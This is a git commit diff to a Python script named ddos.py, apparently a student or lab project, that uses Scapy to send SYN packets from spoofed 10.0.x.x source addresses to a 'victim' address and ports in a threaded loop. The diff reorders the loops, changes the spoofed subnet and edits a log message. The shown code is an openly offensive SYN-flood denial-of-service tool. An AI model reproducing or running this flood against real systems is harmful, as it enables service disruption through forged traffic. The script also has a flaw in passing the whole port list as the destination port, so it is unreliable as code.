731d37e42ab3d2f097f9f3453b16558758d8a1bb
mark-wilmes <mawi0949@colorado.edu>
2017-10-14 16:43:47 -0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -3,12 +3,11 @@ from threading import Thread
 import time
 
 def sendPackets(victimAddress,victimPort):
-	for i in range(1,254):
-		for port in victimPort:
-			packetSYN=IP(src="10.0.0." + str(i), dst=victimAddress,id=1111,ttl=99)/TCP(sport=RandShort(),dport=victimPort,seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
-			print "Sending Packets in 1 second intervals for timeout of 4 sec"
+	for port in victimPort:
+		for i in range(1,254):
+			packetSYN=IP(src="10.0.2." + str(i), dst=victimAddress,id=1111,ttl=99)/TCP(sport=RandShort(),dport=victimPort,seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
+			print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
 			ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)
-
 
 def startDDOS(victimAddress,victimPort,numThreads):
 	for i in range(1,numThreads):
